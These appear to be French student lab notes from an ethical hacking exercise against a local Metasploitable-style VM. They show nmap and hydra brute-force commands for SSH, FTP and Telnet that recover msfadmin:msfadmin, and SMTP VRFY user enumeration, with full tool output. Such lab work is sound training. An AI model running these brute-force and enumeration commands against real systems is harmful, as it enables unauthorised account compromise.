
## 1° Attaque par brute force SSH,FTP,Telnet

>On créer 2  fichiers : - Une liste pour les usernames et Une liste pour les MDP

### a) Attaque par brute force ==SSH== 

		> nmap -p 22 --script /usr/share/nmap/scripts/ssh-brute.nse --script-args userdb=/tmp/UserList,passdb=/tmp/PassList 192.168.56.101
		
	-> On lance donc une attaque par dictionaire et on se connecte 

```bash 
[Sep 11, 2024 - 12:12:51 (CEST)] exegol-EthicalHacking /workspace # hydra -l msfadmin -p msfadmin -t 2 -v 192.168.56.101 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-11 12:12:54
[VERBOSE] More tasks defined than login/pass pairs exist. Tasks reduced to 1
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://192.168.56.101:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://msfadmin@192.168.56.101:22
[ERROR] could not connect to ssh://192.168.56.101:22 - kex error : no match for method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com,rsa-sha2-512,rsa-sha2-256]
``` 

> On a un erreur lié a la clé de chiffrement

   Ensuite on connait les credentials donc on peux se connecter : 
	   	>ssh msfadmin@192.168.56.101 -oHostKeyAlgorithms=+ssh-dss
	   	
## 2° Brute force par FTP
> On essaye de se connecter en brute force via FTP : 

```bash 
[Sep 11, 2024 - 12:23:21 (CEST)] exegol-EthicalHacking /workspace # nmap -p 21 --script /usr/share/nmap/scripts/ftp-brute.nse --script-args userdb=/tmp/UserList,passdb=/tmp/PassList 192.168.56.101
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-11 12:23 CEST
Nmap scan report for 192.168.56.101
Host is up (0.00017s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute:
|   Accounts:
|     msfadmin:msfadmin - Valid credentials
|_  Statistics: Performed 1 guesses in 1 seconds, average tps: 1.0
MAC Address: 08:00:27:13:81:DD (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

On a reussi le brute force par FTP


## 3° Brute force par Telnet :

```bash  
[Sep 11, 2024 - 12:25:34 (CEST)] exegol-EthicalHacking /workspace # nmap -p 23 --script /usr/share/nmap/scripts/telnet-brute.nse --script-args userdb=/tmp/UserList,passdb=/tmp/PassList 192.168.56.101
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-11 12:27 CEST
Nmap scan report for 192.168.56.101
Host is up (0.00023s latency).

PORT   STATE SERVICE
23/tcp open  telnet
| telnet-brute:
|   Accounts:
|     msfadmin:msfadmin - Valid credentials
|_  Statistics: Performed 1 guesses in 1 seconds, average tps: 1.0
MAC Address: 08:00:27:13:81:DD (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

>  telnet 192.168.56.101 25 
>  Ensuite avec VRFY [NOM] on peut tester si l'username existe

## 4° SMTP 

```bash 
smtp-user-enum -M VRFY -U truc.txt -t 192.168.56.101 Starting smtp-user-enum v1.2 ( [http://pentestmonkey.net/tools/smtp-user-enum](http://pentestmonkey.net/tools/smtp-user-enum "http://pentestmonkey.net/tools/smtp-user-enum") ) ---------------------------------------------------------- | Scan Information | ---------------------------------------------------------- Mode ..................... VRFY Worker Processes ......... 5 Usernames file ........... truc.txt Target count ............. 1 Username count ........... 6 Target TCP port .......... 25 Query timeout ............ 5 secs Target domain ............ ######## Scan started at Wed Sep 11 12:37:53 2024 ######### 192.168.56.101: msfadmin exists ######## Scan completed at Wed Sep 11 12:37:53 2024 ######### 1 results.
```

On sait que l'utilisateur ==msfadmin== exist

On rajoute **SYS** a notre list d'user a tester : 

```bash 
smtp-user-enum -M VRFY -U truc.txt -t 192.168.56.101 Starting smtp-user-enum v1.2 ( [http://pentestmonkey.net/tools/smtp-user-enum](http://pentestmonkey.net/tools/smtp-user-enum "http://pentestmonkey.net/tools/smtp-user-enum") ) ---------------------------------------------------------- | Scan Information | ---------------------------------------------------------- Mode ..................... VRFY Worker Processes ......... 5 Usernames file ........... truc.txt Target count ............. 1 Username count ........... 7 Target TCP port .......... 25 Query timeout ............ 5 secs Target domain ............ ######## Scan started at Wed Sep 11 12:40:06 2024 ######### 192.168.56.101: msfadmin exists 192.168.56.101: SYS exists ######## Scan completed at Wed Sep 11 12:40:07 2024 ######### 2 results. 7 queries in 1 seconds (7.0 queries / sec)
```
